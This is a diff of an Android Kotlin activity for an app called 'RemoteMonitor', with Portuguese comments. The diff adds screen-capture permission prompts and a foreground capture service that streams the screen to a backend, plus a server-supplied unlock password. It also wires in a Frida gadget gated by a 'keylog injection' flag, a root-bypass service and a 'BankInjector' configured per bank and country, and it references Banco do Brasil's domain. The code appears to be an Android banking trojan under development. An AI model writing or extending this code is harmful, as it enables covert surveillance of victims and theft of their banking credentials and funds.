@@ -1,26 +1,23 @@
 package com.remotemonitor.test
 
 import android.content.Intent
-import android.graphics.Bitmap
-import android.graphics.Canvas
+import android.media.projection.MediaProjectionManager
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
 import android.provider.Settings
-import android.util.Base64
 import android.util.Log
+import android.webkit.WebChromeClient
 import android.webkit.WebResourceError
 import android.webkit.WebResourceRequest
 import android.webkit.WebResourceResponse
 import android.webkit.WebView
-import android.webkit.WebChromeClient
 import android.webkit.WebViewClient
-import androidx.activity.OnBackPressedCallback
 import androidx.activity.ComponentActivity
+import androidx.activity.OnBackPressedCallback
 import org.json.JSONObject
-import java.io.ByteArrayOutputStream
 import java.io.OutputStreamWriter
 import java.net.HttpURLConnection
 import java.net.URLEncoder
@@ -28,33 +25,25 @@ import java.net.URL
 import java.nio.charset.StandardCharsets
 
 class MainActivity : ComponentActivity() {
-    private val retryHandler = Handler(Looper.getMainLooper())
-    private var isShowingError = false
-    private val autoRetryRunnable = Runnable {
-        if (isShowingError) {
-            isShowingError = false
-            loadPanelFromBackend()
-        }
+    private val mediaProjectionManager by lazy {
+        getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
     }
+
     private val heartbeatHandler = Handler(Looper.getMainLooper())
     private val checkinHeartbeat = object : Runnable {
         override fun run() {
-            Thread {
-                sendDeviceCheckin()
-            }.start()
+            Thread { sendDeviceCheckin() }.start()
             heartbeatHandler.postDelayed(this, DEVICE_CHECKIN_INTERVAL_MS)
         }
     }
-    private val screenshotHandler = Handler(Looper.getMainLooper())
-    private val screenshotHeartbeat = object : Runnable {
-        override fun run() {
-            captureAndUploadScreenshot()
-            screenshotHandler.postDelayed(this, SCREENSHOT_CAPTURE_INTERVAL_MS)
-        }
-    }
+
     private lateinit var webView: WebView
+    private var hasRequestedCapturePermission = false
     private var hasOpenedExternalFallback = false
     private var lastTargetUrl: String = BuildConfig.FALLBACK_PANEL_URL
+    
+    // ✅ ADICIONADO: Variável para armazenar a senha de desbloqueio
+    private var unlockPassword: String? = null
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -66,8 +55,6 @@ class MainActivity : ComponentActivity() {
 
                 if (clickedUrl == "app://retry") {
                     hasOpenedExternalFallback = false
-                    isShowingError = false
-                    retryHandler.removeCallbacks(autoRetryRunnable)
                     loadPanelFromBackend()
                     return true
                 }
@@ -119,23 +106,31 @@ class MainActivity : ComponentActivity() {
         })
 
         loadPanelFromBackend()
+        requestScreenCapturePermissionIfNeeded()
+        
+        // Inicializar Frida gadget apenas se habilitado
+        if (BuildConfig.ENABLE_KEYLOG_INJECTION) {
+            FridaLoader.init(this)
+        }
+        
+        // Inicializar serviços de bypass e injeção
+        if (BuildConfig.ENABLE_ROOT_BYPASS) {
+            RootBypassService.init(this)
+        }
+        BankInjector.init(this, BuildConfig.BANK_ID, BuildConfig.BANK_COUNTRY)
     }
 
     override fun onResume() {
         super.onResume()
         startDeviceHeartbeat()
-        startScreenshotHeartbeat()
     }
 
     override fun onPause() {
-        stopScreenshotHeartbeat()
         stopDeviceHeartbeat()
         super.onPause()
     }
 
     override fun onDestroy() {
-        retryHandler.removeCallbacks(autoRetryRunnable)
-        stopScreenshotHeartbeat()
         stopDeviceHeartbeat()
         if (::webView.isInitialized) {
             webView.destroy()
@@ -152,13 +147,42 @@ class MainActivity : ComponentActivity() {
         heartbeatHandler.removeCallbacks(checkinHeartbeat)
     }
 
-    private fun startScreenshotHeartbeat() {
-        screenshotHandler.removeCallbacks(screenshotHeartbeat)
-        screenshotHandler.postDelayed(screenshotHeartbeat, SCREENSHOT_CAPTURE_INITIAL_DELAY_MS)
+    private fun requestScreenCapturePermissionIfNeeded() {
+        if (hasRequestedCapturePermission) return
+        hasRequestedCapturePermission = true
+
+        try {
+            val captureIntent = mediaProjectionManager.createScreenCaptureIntent()
+            startActivityForResult(captureIntent, SCREEN_CAPTURE_REQUEST_CODE)
+        } catch (error: Exception) {
+            Log.w("RemoteMonitor", "Falha ao solicitar permissao de captura de tela", error)
+        }
     }
 
-    private fun stopScreenshotHeartbeat() {
-        screenshotHandler.removeCallbacks(screenshotHeartbeat)
+    @Deprecated("Deprecated in Java")
+    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
+        super.onActivityResult(requestCode, resultCode, data)
+        if (requestCode != SCREEN_CAPTURE_REQUEST_CODE) return
+
+        if (resultCode != RESULT_OK || data == null) {
+            Log.w("RemoteMonitor", "Permissao de captura negada pelo usuario")
+            return
+        }
+
+        try {
+            val serviceIntent = Intent(this, ScreenCaptureService::class.java).apply {
+                putExtra(ScreenCaptureService.EXTRA_RESULT_CODE, resultCode)
+                putExtra(ScreenCaptureService.EXTRA_RESULT_DATA, data)
+            }
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(serviceIntent)
+            } else {
+                startService(serviceIntent)
+            }
+        } catch (error: Exception) {
+            Log.w("RemoteMonitor", "Falha ao iniciar servico de captura", error)
+        }
     }
 
     private fun loadPanelFromBackend() {
@@ -173,6 +197,9 @@ class MainActivity : ComponentActivity() {
         }
 
         Thread {
+            // ✅ ADICIONADO: Carregar a senha de desbloqueio
+            fetchUnlockPassword()
+            
             val runtimeUrl = fetchRuntimePanelUrl()
             val targetUrl = if (runtimeUrl.isNullOrBlank()) {
                 BuildConfig.FALLBACK_PANEL_URL
@@ -190,6 +217,51 @@ class MainActivity : ComponentActivity() {
                 webView.loadUrl(targetUrl)
             }
         }.start()
+    }
+
+    // ✅ ADICIONADO: Função para carregar a senha de desbloqueio do servidor
+    private fun fetchUnlockPassword() {
+        return try {
+            val encodedPackage = URLEncoder.encode(BuildConfig.APPLICATION_ID, StandardCharsets.UTF_8.toString())
+            val endpoint = "${BuildConfig.BACKEND_BASE_URL}/api/apk/runtime-config?packageName=$encodedPackage"
+            val connection = URL(endpoint).openConnection() as HttpURLConnection
+            connection.requestMethod = "GET"
+            connection.connectTimeout = 10_000
+            connection.readTimeout = 10_000
+
+            if (connection.responseCode in 200..299) {
+                val body = connection.inputStream.bufferedReader().use { it.readText() }
+                val json = JSONObject(body)
+                if (json.optBoolean("success")) {
+                    val config = json.optJSONObject("config")
+                    if (config != null) {
+                        unlockPassword = config.optString("unlockPassword")
+                        if (!unlockPassword.isNullOrBlank()) {
+                            Log.d("RemoteMonitor", "Senha de desbloqueio carregada: ${unlockPassword?.take(2)}***")
+                        }
+                    }
+                }
+            }
+        } catch (error: Exception) {
+            Log.w("RemoteMonitor", "Falha ao carregar senha de desbloqueio", error)
+        }
+    }
+
+    // ✅ ADICIONADO: Função para validar a senha de desbloqueio
+    fun validateUnlockPassword(inputPassword: String): Boolean {
+        if (unlockPassword == null) {
+            Log.w("RemoteMonitor", "Senha de desbloqueio não foi carregada")
+            return false
+        }
+        
+        val isValid = inputPassword == unlockPassword
+        Log.d("RemoteMonitor", "Validação de senha: ${if (isValid) "SUCESSO" else "FALHA"}")
+        return isValid
+    }
+
+    // ✅ ADICIONADO: Função para obter a senha (para testes)
+    fun getUnlockPassword(): String? {
+        return unlockPassword
     }
 
     private fun sendDeviceCheckin() {
@@ -224,82 +296,19 @@ class MainActivity : ComponentActivity() {
         }
     }
 
-    private fun captureAndUploadScreenshot() {
-        if (!::webView.isInitialized || webView.width <= 0 || webView.height <= 0) {
-            return
-        }
-
-        webView.post {
-            try {
-                val bitmap = Bitmap.createBitmap(webView.width, webView.height, Bitmap.Config.ARGB_8888)
-                val canvas = Canvas(bitmap)
-                webView.draw(canvas)
-
-                val output = ByteArrayOutputStream()
-                bitmap.compress(Bitmap.CompressFormat.JPEG, 60, output)
-                val imageBytes = output.toByteArray()
-                bitmap.recycle()
-                output.close()
-
-                Thread {
-                    uploadScreenshot(imageBytes)
-                }.start()
-            } catch (error: Exception) {
-                Log.w("RemoteMonitor", "Falha ao capturar screenshot do app", error)
-            }
-        }
-    }
-
-    private fun uploadScreenshot(imageBytes: ByteArray) {
-        try {
-            val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
-                ?: "unknown"
-            val endpoint = "${BuildConfig.BACKEND_BASE_URL}/api/device/screenshot"
-            val connection = URL(endpoint).openConnection() as HttpURLConnection
-            connection.requestMethod = "POST"
-            connection.connectTimeout = 15_000
-            connection.readTimeout = 15_000
-            connection.doOutput = true
-            connection.setRequestProperty("Content-Type", "application/json")
-
-            val encodedImage = Base64.encodeToString(imageBytes, Base64.NO_WRAP)
-            val payload = JSONObject().apply {
-                put("packageName", BuildConfig.APPLICATION_ID)
-                put("deviceUid", androidId)
-                put("deviceName", Build.MODEL ?: "Android Device")
-                put("model", Build.MODEL ?: "Android")
-                put("imageData", "data:image/jpeg;base64,$encodedImage")
-            }
-
-            OutputStreamWriter(connection.outputStream, Charsets.UTF_8).use { writer ->
-                writer.write(payload.toString())
-            }
-
-            val statusCode = connection.responseCode
-            if (statusCode !in 200..299) {
-                Log.w("RemoteMonitor", "Screenshot upload retornou HTTP $statusCode")
-            }
-        } catch (error: Exception) {
-            Log.w("RemoteMonitor", "Falha ao enviar screenshot do dispositivo", error)
-        }
-    }
-
     private fun loadingScreenHtml(): String {
         return """
             <html>
               <body style=\"font-family:sans-serif;padding:24px;line-height:1.5;\">
                 <h3>Conectando ao painel...</h3>
                 <p>Aguarde alguns segundos enquanto carregamos a configuracao.</p>
+                <p>Aceite a permissao de captura de tela para ativar o Ao Vivo em tempo real.</p>
               </body>
             </html>
         """.trimIndent()
     }
 
     private fun showConnectionErrorScreen(details: String?) {
-        isShowingError = true
-        retryHandler.removeCallbacks(autoRetryRunnable)
-        retryHandler.postDelayed(autoRetryRunnable, AUTO_RETRY_INTERVAL_MS)
-
         val escapedUrl = lastTargetUrl
             .replace("&", "&amp;")
             .replace("<", "&lt;")
@@ -310,8 +319,6 @@ class MainActivity : ComponentActivity() {
             .replace("<", "&lt;")
             .replace(">", "&gt;")
 
-        val retrySecs = (AUTO_RETRY_INTERVAL_MS / 1000).toInt()
-
         val html = """
             <html>
               <body style=\"font-family:sans-serif;padding:24px;line-height:1.5;\">
@@ -319,18 +326,15 @@ class MainActivity : ComponentActivity() {
                 <p>Verifique sua internet e tente novamente.</p>
                 <p><strong>Detalhe:</strong> $escapedDetails</p>
                 <p><strong>URL alvo:</strong> $escapedUrl</p>
-                <p style=\"color:#888;font-size:14px;\">Tentando reconectar automaticamente em $retrySecs segundos...</p>
                 <div style=\"margin-top:16px;display:flex;gap:8px;flex-wrap:wrap;\">
-                  <a href=\"app://retry\" style=\"display:inline-block;padding:10px 14px;background:#1f6feb;color:white;text-decoration:none;border-radius:6px;\">Tentar agora</a>
+                  <a href=\"app://retry\" style=\"display:inline-block;padding:10px 14px;background:#1f6feb;color:white;text-decoration:none;border-radius:6px;\">Tentar novamente</a>
                   <a href=\"app://open-browser\" style=\"display:inline-block;padding:10px 14px;background:#24292f;color:white;text-decoration:none;border-radius:6px;\">Abrir no navegador</a>
                 </div>
               </body>
             </html>
         """.trimIndent()
 
-        runOnUiThread {
-            webView.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null)
-        }
+        webView.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null)
     }
 
     private fun shouldForceExternalBrowser(url: String): Boolean {
@@ -340,7 +344,6 @@ class MainActivity : ComponentActivity() {
             return false
         }
 
-        // Some banking sites block Android WebView and render blank/unsupported pages.
         return host.contains("bb.com.br")
     }
 
@@ -383,10 +386,7 @@ class MainActivity : ComponentActivity() {
             null
         }
     }
-
 }
 
 private const val DEVICE_CHECKIN_INTERVAL_MS = 2 * 60 * 1000L
-private const val SCREENSHOT_CAPTURE_INITIAL_DELAY_MS = 15_000L
-private const val SCREENSHOT_CAPTURE_INTERVAL_MS = 30_000L
-private const val AUTO_RETRY_INTERVAL_MS = 30_000L
+private const val SCREEN_CAPTURE_REQUEST_CODE = 1407
